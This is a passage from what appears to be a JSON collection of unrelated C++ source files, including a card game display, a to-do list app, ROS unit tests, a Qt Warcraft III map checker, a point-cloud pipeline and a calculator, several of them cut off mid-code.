GetClient(fd)->GetFd(), \" :No such channel\\r\\n\");\n\t}\n}\n",
    "//\n// Created by Asus on 03/11/2024.\n//\n#include \"Card.h\"\n#include <algorithm>\n#include <iostream>\n#include <iomanip>\n#include \"KingdomCard.h\"\n#include \"TreasureCard.h\"\n#include \"VictoryCard.h\"\n\n\n\nCard::Card(std::string nom,int cost):m_nom(std::move(nom)),m_cost(cost){};\nint Card::getCost() const\n{\n    return m_cost;\n}\n\n// Normalisation de la chaine de caract\u00e8res (majuscule)\nstd::string normalize(const std::string& s) {\n    std::string res = s;\n    std::ranges::transform(res.begin(), res.end(), res.begin(), ::toupper);\n    return res;\n}\n\nstd::string Card::getNom() const\n{\n    return m_nom;\n}\n\nvoid notif(std::string const& message)\n{\n    std::cout<<\"\\033[92m\"<<message<<\"\\033[0m\"<<std::endl;\n}\n\nvoid alert(std::string const& message)\n{\n    std::cout<<\"\\033[31m\"<<message<<\"\\033[0m\"<<std::endl;\n}\nvoid appuyerPourContinuer() {\n\n    std::cout << \"Entrez une touche pour continuer... > \" ;\n    std::cin.get();  // Attendre que l'utilisateur appuie sur une touche\n    std::cin.ignore();  // Ignorer le caract\u00e8re '\\n' restant\n}\nvoid Card::afficheCards(const std::vector<Card*>& cards) {\n    constexpr int maxCartesParLigne = 5;\n    std::vector<std::tuple<std::string, int, std::string, std::string>> cartes;\n\n    for (const auto& card : cards) {\n        if (card) { // V\u00e9rifiez que la carte n'est pas nulle\n            std::string type;\n            std::string extraInfo;\n            std::string colorCode;\n\n            if (auto* k=dynamic_cast<KingdomCard*>(card)) {\n                type = \"ROYAUME\";\n                extraInfo = KingdomCard::actionType(*k);\n                colorCode = \"\\033[34m\";  // Bleu pour Royaume\n            } else if (auto* treasureCard = dynamic_cast<TreasureCard*>(card)) {\n                type = \"TRESOR\";\n                extraInfo = \"Piece : \" + std::to_string(treasureCard->getTreasure());\n                colorCode = \"\\033[33m\";  // Jaune pour Tr\u00e9sor\n            } else if (auto* victoryCard = dynamic_cast<VictoryCard*>(card)) {\n                type = \"VICTOIRE\";\n                extraInfo = \"PV : \" + std::to_string(victoryCard->getVictory());\n                colorCode = \"\\033[32m\";  // Vert pour Victoire\n            } else {\n                type = \"Inconnu\";\n                extraInfo = \"N/A\";\n                colorCode = \"\\033[0m\";  // R\u00e9initialiser pour inconnu\n            }\n\n            cartes.emplace_back(colorCode + card->getNom() + \"\\033[0m\", card->getCost(), type, extraInfo);\n        }\n    }\n\n    // Affichage des cartes\n    const size_t totalCartes = cartes.size();\n\n    for (size_t i = 0; i < totalCartes; i += maxCartesParLigne) {\n        // Bordures sup\u00e9rieures des cartes\n        for (size_t j = i; j < i + maxCartesParLigne && j < totalCartes; ++j) {\n            std::cout << \"\\033[31m+----------------+\\033[0m  \";\n        }\n        std::cout << std::endl;\n\n        // Ligne contenant le nom des cartes\n        for (size_t j = i; j < i + maxCartesParLigne && j < totalCartes; ++j) {\n            std::cout << \"\\033[31m|\\033[0m \" << std::setw(24) << std::left\n                      << std::get<0>(cartes[j]) << \"\\033[31m|\\033[0m  \";\n        }\n        std::cout << std::endl;\n\n        // Ligne contenant le type des cartes\n        for (size_t j = i; j < i + maxCartesParLigne && j < totalCartes; ++j) {\n            std::cout << \"\\033[31m|\\033[0m Type:\" << std::setw(10) << std::left\n                      << std::get<2>(cartes[j]) << \"\\033[31m|\\033[0m  \";\n        }\n        std::cout << std::endl;\n\n        // Ligne contenant le co\u00fbt des cartes\n        for (size_t j = i; j < i + maxCartesParLigne && j < totalCartes; ++j) {\n            std::cout << \"\\033[31m|\\033[0m Cout: \" << std::setw(9) << std::left\n                      << std::get<1>(cartes[j]) << \"\\033[31m|\\033[0m  \";\n        }\n        std::cout << std::endl;\n\n        // Ligne contenant les informations suppl\u00e9mentaires\n        for (size_t j = i; j < i + maxCartesParLigne && j < totalCartes; ++j) {\n            std::cout << \"\\033[31m|\\033[0m \" << std::setw(15) << std::left\n                      << std::get<3>(cartes[j]) << \"\\033[31m|\\033[0m  \";\n        }\n        std::cout << std::endl;\n\n        // Bordures inf\u00e9rieures des cartes\n        for (size_t j = i; j < i + maxCartesParLigne && j < totalCartes; ++j) {\n            std::cout << \"\\033[31m+----------------+\\033[0m  \";\n        }\n        std::cout << std::endl << std::endl;  // Espace entre les rang\u00e9es de cartes\n    }\n}\n\n",
    "#include <iostream>  // For input and output operations\n#include <vector>    // For using the dynamic array (vector) to store tasks\n#include <string>    // For working with strings\n#include <fstream>   // For file handling to save/load tasks\n\nusing namespace std;\n\n// Define a structure to store individual task details\nstruct Task {\n    string description; // The task's description\n    string priority;    // Priority level: High, Medium, or Low\n    bool isCompleted;   // Completion status: true = completed, false = pending\n};\n\n// Class to manage the To-Do List application\nclass ToDoList {\nprivate:\n    vector<Task> tasks; // A vector to dynamically store the list of tasks\n\npublic:\n    // Function to load tasks from a file when the program starts\n    void loadFromFile(const string &filename) {\n        ifstream file(filename);\n        if (!file) {\n            cout << \"No saved tasks found.\\n\";\n            return;\n        }\n\n        Task task;\n        while (file >> task.description >> task.priority >> task.isCompleted) {\n            tasks.push_back(task);\n        }\n        file.close();\n        cout << \"Tasks loaded from file successfully!\\n\";\n    }\n\n    // Function to save tasks to a file when the program exits\n    void saveToFile(const string &filename) {\n        ofstream file(filename);\n        for (const auto &task : tasks) {\n            file << task.description << \" \" << task.priority << \" \" << task.isCompleted << \"\\n\";\n        }\n        file.close();\n        cout << \"Tasks saved successfully!\\n\";\n    }\n\n    // Function to add a new task to the list\n    void addTask() {\n        Task newTask;\n        cout << \"Enter task description: \";\n        cin.ignore();\n        getline(cin, newTask.description);\n\n        cout << \"Enter priority (High/Medium/Low): \";\n        cin >> newTask.priority;\n        newTask.isCompleted = false;\n        tasks.push_back(newTask);\n        cout << \"Task added successfully!\\n\";\n    }\n\n    // Function to display all tasks in the list\n    void displayTasks() {\n        if (tasks.empty()) {\n            cout << \"Your to-do list is empty.\\n\";\n            return;\n        }\n\n        cout << \"\\nYour To-Do List:\\n\";\n        for (size_t i = 0; i < tasks.size(); ++i) {\n            cout << i + 1 << \". \" << tasks[i].description\n                 << \" | Priority: \" << tasks[i].priority\n                 << \" | Status: \" << (tasks[i].isCompleted ? \"\u2714 Completed\" : \"\u274c Pending\") << \"\\n\";\n        }\n    }\n\n    // Function to calculate and display the percentage of completed tasks\n    void displayCompletionPercentage() {\n        if (tasks.empty()) {\n            cout << \"Your to-do list is empty. Completion percentage: 0%\\n\";\n            return;\n        }\n\n        int completedTasks = 0;\n        for (const auto &task : tasks) {\n            if (task.isCompleted) {\n                completedTasks++;\n            }\n        }\n\n        double percentage = (static_cast<double>(completedTasks) / tasks.size()) * 100;\n        cout << \"Completion Percentage: \" << percentage << \"%\\n\";\n    }\n\n    // Function to mark a task as completed\n    void markTaskCompleted() {\n        if (tasks.empty()) {\n            cout << \"Your to-do list is empty.\\n\";\n            return;\n        }\n\n        displayTasks();\n        int index;\n        cout << \"Enter the task number to mark as completed: \";\n        cin >> index;\n\n        if (index < 1 || index > tasks.size()) {\n            cout << \"Invalid task number!\\n\";\n            return;\n        }\n\n        tasks[index - 1].isCompleted = true;\n        cout << \"Task marked as completed successfully!\\n\";\n    }\n\n    // Function to delete a task from the list\n    void deleteTask() {\n        if (tasks.empty()) {\n            cout << \"Your to-do list is empty.\\n\";\n            return;\n        }\n\n        displayTasks();\n        int index;\n        cout << \"Enter the task number to delete: \";\n        cin >> index;\n\n        if (index < 1 || index > tasks.size()) {\n            cout << \"Invalid task number!\\n\";\n            return;\n        }\n\n        tasks.erase(tasks.begin() + index - 1);\n        cout << \"Task deleted successfully!\\n\";\n    }\n};\n\n// Main function to run the application\nint main() {\n    ToDoList myList;\n    string filename = \"tasks.txt\";\n\n    myList.loadFromFile(filename);\n\n    int choice;\n    do {\n        cout << \"\\nTo-Do List Menu:\\n\";\n        cout << \"1. Add Task\\n\";\n        cout << \"2. Display Tasks\\n\";\n        cout << \"3. Display Completion Percentage\\n\";\n        cout << \"4. Mark Task as Completed\\n\";\n        cout << \"5. Delete Task\\n\";\n        cout << \"6. Save and Exit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n        case 1:\n            myList.addTask();\n            break;\n        case 2:\n            myList.displayTasks();\n            break;\n        case 3:\n            myList.displayCompletionPercentage();\n            break;\n        case 4:\n            myList.markTaskCompleted();\n            break;\n        case 5:\n            myList.delet",
    "#include \"Geometry.hpp\"\n\nGeometry::Geometry(const std::size_t& dim, const double& bound, const std::size_t& numPoints) : m_dim{dim}, m_bound{bound}, m_numPoints{numPoints}\n{\n    checkDomainDimension(m_dim);\n    \n    // Create a grid of points (either 2D or 3D)\n    constructWorld();\n};\n\nint Geometry::checkDomainDimension(const std::size_t& dim)\n{\n    if (dim != 2 && dim != 3)\n    {\n        std::cerr << \"Currently only implemented for 2D and 3D domains.\" << std::endl;\n        return -1;\n    }\n\n    return 0;\n};\n\nvoid Geometry::constructWorld()\n{\n    if (m_dim == 2)\n    {\n        std::cout << \"Constructing 2D world...\" << std::endl;\n        std::vector<Point2D>& grid {std::get<std::vector<Point2D>>(m_grid)};\n        grid.reserve(m_numPoints * m_numPoints);\n        double dx = 2*m_bound / static_cast<double>(m_numPoints);\n        for (std::size_t i = 0; i < m_numPoints+1; ++i)\n        {\n            for (std::size_t j = 0; j < m_numPoints+1; ++j)\n            {\n                grid.emplace_back(Point2D(-m_bound + static_cast<double>(i)*dx, -m_bound + static_cast<double>(j)*dx));\n            }\n        }\n    }\n    else if (m_dim == 3)\n    {\n        std::cout << \"Constructing 3D world...\" << std::endl;\n        std::vector<Point3D>& grid {std::get<std::vector<Point3D>>(m_grid)};\n        grid.reserve(m_numPoints * m_numPoints * m_numPoints);\n        double dx = 2*m_bound / static_cast<double>(m_numPoints);\n        for (std::size_t i = 0; i < m_numPoints+1; ++i)\n        {\n            for (std::size_t j = 0; j < m_numPoints+1; ++j)\n            {\n                for (std::size_t k = 0; k < m_numPoints+1; ++k)\n                {\n                    grid.emplace_back(Point3D(-m_bound + static_cast<double>(i)*dx, -m_bound + static_cast<double>(j)*dx, -m_bound + static_cast<double>(k)*dx));\n                }\n            }\n        }\n    }\n    // Don't need an else statement since checkDomainDimension() should catch any other cases\n};\n\nvoid Geometry::writeGrid(const std::string& filename, const std::string ext, const std::string delimiter)\n{\n    // Currently for macOS, will change to $HOME for Linux\n    std::ofstream file(\"/Users/max/ClassicalEM++/outputs/\" + filename + \".\" + ext);\n\n    // ensure file is open for writing (needs to caught in a try catch block)\n    if (!file.is_open()) {\n        throw std::ios_base::failure(\"Failed to open file for writing\");\n    }\n    \n    // do not write headers for now\n    // file << 'x' << delimiter << 'y' << '\\n';\n    if (m_dim == 2)\n    {\n        const std::vector<Point2D> grid = std::get<std::vector<Point2D>>(m_grid);\n        for (const Point2D& point : grid)\n        {\n            file << point.x() << delimiter << point.y() << std::endl;\n        }\n    }\n    else if (m_dim == 3)\n    {\n        const std::vector<Point3D> grid = std::get<std::vector<Point3D>>(m_grid);\n        for (const Point3D& point : grid)\n        {\n            file << point.x() << delimiter << point.y() << delimiter << point.z() << std::endl;\n        }\n    }\n    else\n    {\n        std::cerr << \"Error: Dimension not supported.\" << std::endl;\n    }\n};\n",
    "/*\n * Software License Agreement (BSD License)\n *\n *  Copyright (c) 2018, Wilco Bonestroo\n *  All rights reserved.\n *\n *  Redistribution and use in source and binary forms, with or without\n *  modification, are permitted provided that the following conditions\n *  are met:\n *\n *   * Redistributions of source code must retain the above copyright\n *     notice, this list of conditions and the following disclaimer.\n *   * Redistributions in binary form must reproduce the above\n *     copyright notice, this list of conditions and the following\n *     disclaimer in the documentation and/or other materials provided\n *     with the distribution.\n *   * Neither the name of the copyright holder nor the names of its\n *     contributors may be used to endorse or promote products derived\n *     from this software without specific prior written permission.\n *\n *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n *  \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n *  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n *  FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n *  COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n *  INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n *  BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n *  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n *  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n *  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n *  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n *  POSSIBILITY OF SUCH DAMAGE.\n */\n\n#include <memory>\n#include <string>\n\n#include \"gtest/gtest.h\"\n#include \"nav_2d_utils/tf_help.hpp\"\n\nTEST(TF_Help, TransformToSelf) {\n  bool result;\n\n  std::shared_ptr<tf2_ros::Buffer> tf;\n  std::string frame = \"frame_id\";\n  geometry_msgs::msg::PoseStamped in_pose;\n  in_pose.header.frame_id = \"frame_id\";\n  in_pose.pose.position.x = 1.0;\n  in_pose.pose.position.y = 2.0;\n  in_pose.pose.position.z = 3.0;\n  tf2::Quaternion qt;\n  qt.setRPY(0.5, 1.0, 1.5);\n  in_pose.pose.orientation.w = qt.w();\n  in_pose.pose.orientation.x = qt.x();\n  in_pose.pose.orientation.y = qt.y();\n  in_pose.pose.orientation.z = qt.z();\n\n  geometry_msgs::msg::PoseStamped out_pose;\n  rclcpp::Duration transform_tolerance(0, 500);\n\n  result = nav_2d_utils::transformPose(tf, frame, in_pose, out_pose, transform_tolerance);\n\n  EXPECT_TRUE(result);\n  EXPECT_EQ(out_pose.header.frame_id, \"frame_id\");\n  EXPECT_EQ(out_pose.pose.position.x, 1.0);\n  EXPECT_EQ(out_pose.pose.position.y, 2.0);\n  EXPECT_EQ(out_pose.pose.position.z, 3.0);\n  EXPECT_EQ(out_pose.pose.orientation.w, qt.w());\n  EXPECT_EQ(out_pose.pose.orientation.x, qt.x());\n  EXPECT_EQ(out_pose.pose.orientation.y, qt.y());\n  EXPECT_EQ(out_pose.pose.orientation.z, qt.z());\n}\n\nTEST(TF_Help, EmptyBuffer) {\n  auto clock = std::make_shared<rclcpp::Clock>(RCL_ROS_TIME);\n  auto buffer = std::make_shared<tf2_ros::Buffer>(clock);\n\n  std::string frame = \"frame_id\";\n  geometry_msgs::msg::PoseStamped in_pose;\n  in_pose.header.frame_id = \"other_frame_id\";\n  in_pose.pose.position.x = 1.0;\n  in_pose.pose.position.y = 2.0;\n  in_pose.pose.position.z = 3.0;\n  tf2::Quaternion qt;\n  qt.setRPY(0.5, 1.0, 1.5);\n  in_pose.pose.orientation.w = qt.w();\n  in_pose.pose.orientation.x = qt.x();\n  in_pose.pose.orientation.y = qt.y();\n  in_pose.pose.orientation.z = qt.z();\n\n  geometry_msgs::msg::PoseStamped out_pose;\n  rclcpp::Duration transform_tolerance(0, 500);\n\n  bool result;\n  result = nav_2d_utils::transformPose(buffer, frame, in_pose, out_pose, transform_tolerance);\n\n  EXPECT_FALSE(result);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"example_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"mapdispel.h\"\n#include \"./ui_mapdispel.h\"\n#include <QFileDialog>\n#include <sstream>\n\nMapDispel::MapDispel(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MapDispel)\n{\n    ui->setupUi(this);\n    this->baseAddress = QUrl(\"http://0.0.0.0:8080/maps/\");\n    this->networkManager = new QNetworkAccessManager();\n\n    //connect(this->ui->about_button, SIGNAL(triggered()), this, this->on_about_button_clicked());\n    connect(ui->aboutMenuButton, SIGNAL(triggered()), this, SLOT(on_aboutMenuButton_triggered()));\n}\n\nMapDispel::~MapDispel()\n{\n    delete ui;\n}\n\n/**\n * @brief getSelectedDirectory Opens a file dialog where the Warcraft III maps folder is selected\n * @return The directory path to the maps folder\n */\nQString getSelectedDirectory() {\n    return QFileDialog::getExistingDirectory(nullptr, \"Map Directory\", \"MapDispel\");\n}\n\n/**\n * @brief MapDispel::on_openMapDirectory_clicked Opens the directory selection dialog and returns the selected directory.\n */\nvoid MapDispel::on_openMapDirectory_clicked()\n{\n    this->mapDirectoryName = getSelectedDirectory();\n    if(!this->mapDirectoryName.length()) {\n        return;\n    }\n    populateTable();\n}\n\n/**\n * @brief MapDispel::populateTable Clears the map table and re-populates it with detected maps\n */\nvoid MapDispel::populateTable(){\n    QDir mapDir = QDir(this->mapDirectoryName);\n    QFileInfoList mapEntries = mapDir.entryInfoList(QStringList() << \"*.w3x\", QDir::Files);\n    if(!mapEntries.length()) {\n        QMessageBox::warning(nullptr, \"Warning\", \"No Warcraft III maps detected. Try another directory.\");\n        return;\n    }\n    ui->directoryName->setText(this->mapDirectoryName);\n    ui->mapTable->setRowCount(0);\n    this->mapHashes.clear();\n    for (const QFileInfo &mapFile: mapEntries) {\n        filePathMap.insert(mapFile.fileName(), mapFile.absoluteFilePath());\n        ui->mapTable->insertRow(ui->mapTable->rowCount());\n        QTableWidgetItem* mapRowItem = new QTableWidgetItem(mapFile.fileName());\n        ui->mapTable->setItem(ui->mapTable->rowCount()-1,0, mapRowItem);\n\n        QWidget *checkBoxWidget = new QWidget();\n        QCheckBox *checkBox = new QCheckBox(checkBoxWidget);\n        QHBoxLayout *layout = new QHBoxLayout(checkBoxWidget);\n        layout->addWidget(checkBox);\n        layout->setAlignment(Qt::AlignCenter);\n        layout->setContentsMargins(0, 0, 0, 0);\n        ui->mapTable->setCellWidget(ui->mapTable->rowCount()-1,2, checkBoxWidget);\n        computeMD5(mapFile.absoluteFilePath());\n    }\n}\n\n/**\n * @brief MapDispel::computeMD5 Computes the MD5 of a map\n * @param filePath Path to the file whose md5 is being computed\n */\nvoid MapDispel::computeMD5(QString filePath) {\n    QCryptographicHash crypto(QCryptographicHash::Md5);\n    QFile file(filePath);\n    file.open(QFile::ReadOnly);\n    while(!file.atEnd()){\n        crypto.addData(file.read(4096));\n    }\n    auto hash = QString(crypto.result().toHex()).toStdString();\n    this->mapHashes.push_back(hash);\n    file.close();\n}\n\n/**\n * @brief MapDispel::on_pushButton_clicked Called when the \"Check Maps\" button is clicked\n */\nvoid MapDispel::on_pushButton_clicked()\n{\n    this->getMapInfo();\n}\n\n/**\n * @brief MapDispel::deleteFiles Deletes files\n * @param fileNames Vector of fully qualified paths to files for deletion\n */\nvoid MapDispel::deleteFiles(const std::vector<QString> &fileNames) {\n    for (const QString& filename: fileNames) {\n        QFile file(filename);\n        if (file.exists()) {\n            if (!file.remove()) {\n                QMessageBox::warning(nullptr, \"Error\", \"Failed to delete the file.\");\n            }\n        }\n    }\n}\n\n/**\n * @brief MapDispel::getMapsForDeletion Gets the maps selected for deletion from the map table\n * @return A vector of map names that have been selected for deletion\n */\nstd::vector<QString> MapDispel::getMapsForDeletion() {\n    std::vector<QString> deletePaths;\n    for (int row = 0; row < ui->mapTable->rowCount(); ++row) {\n        QWidget *checkBoxWidget = ui->mapTable->cellWidget(row, 2);\n        if (checkBoxWidget) {\n            QCheckBox *checkBox = qobject_cast<QCheckBox*>(checkBoxWidget->children().at(0));\n            if (checkBox) {\n                bool isChecked = checkBox->isChecked();\n                QString filename = ui->mapTable->item(row, 0)->text();\n\n                if (isChecked) {\n                    deletePaths.push_back(this->filePathMap.value(filename));\n                }\n            }\n        }\n    }\n    return deletePaths;\n}\n\n/**\n * @brief MapDispel::getMapInfo Sends a network request to FarSeer to determine the legitimacy of maps\n */\nvoid MapDispel::getMapInfo()\n{\n    std::ostringstream out;\n    if (!this->mapHashes.empty())\n    {\n        std::copy(this->mapHashes.begin(), this->mapHashes.end() - 1, std::ostream_iterator<std::string>(out, \",\"));\n        out << this->mapHashes.back();\n    }\n\n    QNetworkRequest request;\n    request.setUrl(this->baseAddress);\n    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType",
    "//{ Driver Code Starts\n//Initial Template for C++\n\n\n#include <bits/stdc++.h>\nusing namespace std;\n\nvoid insertAtEnd(int arr[],int sizeOfArray,int element);\n\n\n// } Driver Code Ends\n//User function Template for C++\n\n\n// You only need to insert the given element at \n// the end, i.e., at index sizeOfArray - 1. You may \n// assume that the array already has sizeOfArray - 1\n// elements. \nvoid insertAtEnd(int arr[],int sizeOfArray,int element)\n{\n    //Your code here\n    arr[sizeOfArray - 1] = element;\n\n}\n\n\n\n//{ Driver Code Starts.\n\nint main() {\n    int t;\n    \n    //taking testcases\n    cin>>t;\n    while(t--)\n    {\n        int sizeOfArray;\n        \n        //input size of Array\n        cin>>sizeOfArray;\n        \n        int arr[sizeOfArray];\n        \n        //inserting elements in the array\n        for(int i=0;i<sizeOfArray-1;i++)\n        cin>>arr[i];\n        \n        //input element to be inserted\n        int element;\n        cin>>element;\n        \n        //calling insertAtEnd() function\n        insertAtEnd(arr,sizeOfArray,element);\n        \n        //printing the elements of the array\n        for(int i=0;i<sizeOfArray;i++)\n        cout<<arr[i]<<\" \";\n        \n        cout<<endl;\n        \n    }\n    \n\treturn 0;\n}\n// } Driver Code Ends",
    "#include <QCoreApplication>\r\n#include <QTcpSocket>\r\n#include <iostream>\r\n#include <opencv2/opencv.hpp>\r\n#include <pcl/io/pcd_io.h>\r\n#include <pcl/point_types.h>\r\n#include <pcl/filters/voxel_grid.h>\r\n#include <pcl/filters/crop_box.h>\r\n#include <pcl/features/normal_3d.h>\r\n#include <pcl/search/kdtree.h>\r\n#include <pcl/segmentation/extract_clusters.h>\r\n#include <pcl/common/transforms.h>\r\n\r\nusing namespace std;\r\n\r\n// Function to calibrate the camera using OpenCV\r\nvoid calibrateCamera(cv::Mat& cameraMatrix, cv::Mat& distCoeffs) {\r\n    // Object points and image points are needed for calibration\r\n    vector<vector<cv::Point3f>> objectPoints; // Real-world 3D points\r\n    vector<vector<cv::Point2f>> imagePoints; // Corresponding image 2D points\r\n\r\n    // Specify the size of the captured images\r\n    cv::Size imageSize(640, 480);\r\n\r\n    // Perform camera calibration\r\n    cv::calibrateCamera(objectPoints, imagePoints, imageSize, cameraMatrix, distCoeffs, cv::noArray(), cv::noArray());\r\n}\r\n\r\n// Function to load a point cloud from a file\r\npcl::PointCloud<pcl::PointXYZ>::Ptr loadPointCloud(const string& filePath) {\r\n    pcl::PointCloud<pcl::PointXYZ>::Ptr cloud(new pcl::PointCloud<pcl::PointXYZ>);\r\n    if (pcl::io::loadPCDFile(filePath, *cloud) == -1) {\r\n        cerr << \"Failed to load point cloud file: \" << filePath << endl;\r\n        exit(-1); // Exit if the file cannot be loaded\r\n    }\r\n    return cloud;\r\n}\r\n\r\n// Function to downsample the point cloud using a voxel grid\r\npcl::PointCloud<pcl::PointXYZ>::Ptr filterPointCloud(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud) {\r\n    pcl::VoxelGrid<pcl::PointXYZ> voxelFilter;\r\n    voxelFilter.setInputCloud(cloud);\r\n    voxelFilter.setLeafSize(0.01f, 0.01f, 0.01f); // Leaf size controls the resolution\r\n    pcl::PointCloud<pcl::PointXYZ>::Ptr filteredCloud(new pcl::PointCloud<pcl::PointXYZ>);\r\n    voxelFilter.filter(*filteredCloud);\r\n    return filteredCloud;\r\n}\r\n\r\n// Function to extract a Region of Interest (ROI) from the point cloud\r\npcl::PointCloud<pcl::PointXYZ>::Ptr extractROI(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud) {\r\n    pcl::CropBox<pcl::PointXYZ> cropFilter;\r\n    cropFilter.setMin(Eigen::Vector4f(-1.0, -1.0, -1.0, 1.0)); // Define the minimum corner of the ROI\r\n    cropFilter.setMax(Eigen::Vector4f(1.0, 1.0, 1.0, 1.0));   // Define the maximum corner of the ROI\r\n    cropFilter.setInputCloud(cloud);\r\n    pcl::PointCloud<pcl::PointXYZ>::Ptr roiCloud(new pcl::PointCloud<pcl::PointXYZ>);\r\n    cropFilter.filter(*roiCloud);\r\n    return roiCloud;\r\n}\r\n\r\n// Function to compute normal vectors for the point cloud\r\npcl::PointCloud<pcl::Normal>::Ptr calculateNormals(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud) {\r\n    pcl::NormalEstimation<pcl::PointXYZ, pcl::Normal> normalEstimator;\r\n    pcl::search::KdTree<pcl::PointXYZ>::Ptr tree(new pcl::search::KdTree<pcl::PointXYZ>);\r\n    pcl::PointCloud<pcl::Normal>::Ptr normals(new pcl::PointCloud<pcl::Normal>);\r\n    normalEstimator.setInputCloud(cloud);\r\n    normalEstimator.setSearchMethod(tree);\r\n    normalEstimator.setRadiusSearch(0.03); // Neighborhood radius for normal estimation\r\n    normalEstimator.compute(*normals);\r\n    return normals;\r\n}\r\n\r\n// Function to cluster points using Euclidean clustering\r\nvoid clusterPointCloud(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud) {\r\n    pcl::search::KdTree<pcl::PointXYZ>::Ptr tree(new pcl::search::KdTree<pcl::PointXYZ>);\r\n    pcl::EuclideanClusterExtraction<pcl::PointXYZ> ec;\r\n    ec.setClusterTolerance(0.02); // Distance threshold for clustering\r\n    ec.setMinClusterSize(100);   // Minimum number of points in a cluster\r\n    ec.setMaxClusterSize(25000); // Maximum number of points in a cluster\r\n    ec.setSearchMethod(tree);\r\n    ec.setInputCloud(cloud);\r\n\r\n    vector<pcl::PointIndices> clusterIndices;\r\n    ec.extract(clusterIndices);\r\n\r\n    cout << \"Number of clusters found: \" << clusterIndices.size() << endl;\r\n}\r\n\r\n// Function to send coordinates to a master system via TCP/IP\r\nvoid sendCoordinates(const string& ip, int port, const Eigen::Vector3f& coordinates) {\r\n    QTcpSocket socket;\r\n    socket.connectToHost(QString::fromStdString(ip), port);\r\n    if (socket.waitForConnected(3000)) {\r\n        // Format the message with the coordinates\r\n        stringstream message;\r\n        message << \"Coordinates: \" << coordinates[0] << \", \" << coordinates[1] << \", \" << coordinates[2] << \"\\n\";\r\n        socket.write(message.str().c_str());\r\n    } else {\r\n        cerr << \"Failed to connect to master system at \" << ip << \":\" << port << endl;\r\n    }\r\n}\r\n\r\nint main(int argc, char *argv[]) {\r\n    QCoreApplication a(argc, argv);\r\n\r\n    // Step 1: Perform camera calibration\r\n    cv::Mat cameraMatrix, distCoeffs;\r\n    calibrateCamera(cameraMatrix, distCoeffs);\r\n\r\n    // Step 2: Load the point cloud data\r\n    auto cloud = loadPointCloud(\"pointcloud.pcd\"); // Replace with your point cloud file\r\n\r\n    // Step 3: Downsample the point cloud for faster processing\r\n    auto filteredCloud = filterPointCloud(cloud);\r\n\r\n    // Step 4:",
    "#include <iostream>\n#include <string>\n#include <conio.h>\n#include <iomanip>\nusing namespace std;\nvoid numbers(double* ptr, int* i, bool* bptr, int* z);\nvoid ops(double *fptr, double *sptr, int op);\n\n\n\n\nint main() {\n\tdouble first = 0, second = 0; \n\tint i = 0;\n\tbool Deci= false,snum=false;\n\tint operate;\n\t\n\twhile (true)\n\t{\tcout << \"enter a number followed by an operation sign\" << endl;\n\t\ti = _getch();\n\t\tif (i == 46) {\n\t\t\tDeci = true;\n\t\t}\n\t\t\n\t\tfor (int z=0;(i >= 45 && i <= 57) || i == 46 || (i >= 42 && i <=43);z++) {\n\t\t\tif (((i >= 42 && i <= 43) || (i == 45 || i == 47))&& snum==false) {\n\t\t\t\tsnum = true;\n\t\t\t\tDeci = false;\n\t\t\t\toperate = i;\n\t\t\t\ti = 48;\n\t\t\t}\n\t\t\telse if (((i >= 42 && i <= 43) || (i == 45 || i == 47)) && snum == true) {\n\t\t\t\tint temp = i;\n\t\t\t\ti = 48;\n\t\t\t\tops(&first, &second, operate);\n\t\t\t\tsecond = 0;\n\t\t\t\toperate = temp;\n\t\t\t\t\n\t\t\t\tz = 1;\n\t\t\t}\n\n\t\t\tif (snum == false) { numbers(&first, &i, &Deci, &z); }\n\t\t\telse {\n\t\t\t\t\n\t\t\t\tnumbers(&second, &i, &Deci, &z);\n\t\t\t\n\t\t\t}\n\n\n\n\t\t}\n\n\n\n\t\tif (i == 13) {\n\t\t\n\t\t\tops(&first, &second, operate);\n\t\t\tsnum = false;\n\t\t\tDeci = false;\n\t\t\tcout << first <<endl;\n\t\t\tfirst = 0;\n\t\t\tsecond = 